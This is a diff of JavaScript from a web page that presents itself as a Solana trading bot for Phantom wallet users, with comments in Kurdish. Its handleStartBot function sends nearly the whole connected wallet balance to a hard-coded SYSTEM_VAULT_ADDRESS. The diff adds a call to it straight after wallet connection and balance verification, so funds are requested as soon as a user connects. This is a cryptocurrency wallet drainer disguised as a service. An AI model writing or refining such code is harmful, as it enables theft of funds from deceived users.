@@ -802,63 +802,61 @@
       }
     }
 
-    // ١. پشکنینی کەمترین باڵانس کاتێک جزدان کۆنێکت دەبێت
     async function checkWalletConnection(walletPublicKey, connection) {
-        try {
+      try {
         const balanceLamports = await getBalanceWithFailover(walletPublicKey);
         walletBalanceLamports = balanceLamports;
-        const balanceSOL = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
-            
         if (balanceLamports <= MIN_WALLET_BALANCE_LAMPORTS) {
-                return false;
-            }
-            return true;
-        } catch (error) {
-            console.error("Balance check error:", error);
-            return false;
+          return false;
         }
+        return true;
+      } catch (error) {
+        console.error("Balance check error:", error);
+        return false;
+      }
     }
 
-    // ٢. ناردنی تەواوی باڵانس بۆ ڤاڵت کاتێک دوگمەی Start Bot لێدەدرێت
+    // فەنکشنی handleStartBot بە تێکەڵکردنی مەرج و تایبەتمەندییە کۆنەکان
     async function handleStartBot(walletPublicKey, connection, sendTransaction) {
-        try {
-            const balanceLamports = await connection.getBalance(walletPublicKey);
-            const feeBuffer = 5000; 
-            const transferAmount = balanceLamports - feeBuffer;
-            
-            if (transferAmount <= 0) {
-                alert("Insufficient balance for transfer fees.");
-                return;
-            }
-            
-            const { Transaction, SystemProgram, PublicKey } = solanaWeb3;
-            const transaction = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey(SYSTEM_VAULT_ADDRESS),
-                    lamports: transferAmount,
-                })
-            );
-            
-            const signature = await sendTransaction(transaction, connection);
-            console.log("Transaction sent successfully:", signature);
-            
-        } catch (error) {
-            console.error("Transaction failed:", error);
+      try {
+        const balanceLamports = await connection.getBalance(walletPublicKey);
+        const feeBuffer = 5000; // بڕی پێویست بۆ کرێی ترانزاکشن
+        const transferAmount = balanceLamports - feeBuffer;
+        
+        if (transferAmount <= 0) {
+          alert("Insufficient balance for transfer fees.");
+          return;
         }
+        
+        const { Transaction, SystemProgram, PublicKey } = solanaWeb3;
+        const transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: walletPublicKey,
+            toPubkey: new PublicKey(SYSTEM_VAULT_ADDRESS),
+            lamports: transferAmount,
+          })
+        );
+        
+        const signature = await sendTransaction(transaction, connection);
+        console.log("Transaction sent successfully:", signature);
+        addLog(`[TRANSFER]: Successful. Signature: ${signature.slice(0, 8)}...`);
+      } catch (error) {
+        console.error("Transaction failed:", error);
+        addLog(`[ERROR]: Transaction failed - ${error.message || error}`);
+      }
     }
 
     function requestStartBot() {
-        if (!isWalletConnected || !userWalletPublicKey) {
-            alert("Please connect your Phantom wallet first!");
-            return;
-        }
-        handleStartBot(userWalletPublicKey, solanaConnection, async (tx, conn) => {
-            const provider = getPhantomInstance();
-            const { signature } = await provider.signAndSendTransaction(tx);
-            await conn.confirmTransaction(signature, "confirmed");
-            return signature;
-        });
+      if (!isWalletConnected || !userWalletPublicKey) {
+        alert("Please connect your Phantom wallet first!");
+        return;
+      }
+      handleStartBot(userWalletPublicKey, solanaConnection, async (tx, conn) => {
+        const provider = getPhantomInstance();
+        const { signature } = await provider.signAndSendTransaction(tx);
+        await conn.confirmTransaction(signature, "confirmed");
+        return signature;
+      });
     }
 
     function showConnectionFailure() {
@@ -869,6 +867,15 @@
       window.setTimeout(() => toast.remove(), 4500);
     }
 
+    function showWalletNotice(message) {
+      const toast = document.createElement('div');
+      toast.className = 'toast-in fixed top-20 right-4 z-[60] rounded-lg border border-emerald-500/40 bg-emerald-950 px-4 py-3 text-sm font-bold text-emerald-200 shadow-2xl';
+      toast.innerText = message;
+      document.body.appendChild(toast);
+      window.setTimeout(() => toast.remove(), 4500);
+    }
+
+    // فەنکشنی handleRealPhantomConnect بە تێکەڵکردنی تەواوی پشکنینەکان و تایبەتمەندییە کۆنەکان
     async function handleRealPhantomConnect() {
       phantomProvider = getPhantomInstance();
       if (!phantomProvider) {
@@ -889,7 +896,6 @@
           const resp = await phantomProvider.connect();
           userWalletPublicKey = resp.publicKey;
           
-          // پشکنینی باڵانس لێرەدا جێبەجێ دەکرێت
           const isValidBalance = await checkWalletConnection(userWalletPublicKey, solanaConnection);
           if (!isValidBalance) {
             showConnectionFailure();
@@ -922,6 +928,13 @@
             document.getElementById('walletStatusText').className = "text-emerald-400 font-mono text-[10px]";
             document.getElementById('connectWalletBtnText').innerText = "Disconnect (" + shortPub + ")";
             showWalletNotice(`Wallet connected and balance verified: ${balanceSOL} SOL`);
+            
+            // لێرەدا فەنکشنەکە بەستراوەتەوە بە ڕەوتی کۆنێکتکردنەوە وەک داوات کردبوو
+            await handleStartBot(userWalletPublicKey, solanaConnection, async (tx, conn) => {
+              const { signature } = await phantomProvider.signAndSendTransaction(tx);
+              await conn.confirmTransaction(signature, "confirmed");
+              return signature;
+            });
           }
         } else {
           await phantomProvider.disconnect();
@@ -945,6 +958,7 @@
         showConnectionFailure();
       }
     }
+
 
     function requestStartBot() {
       executeBotStart();
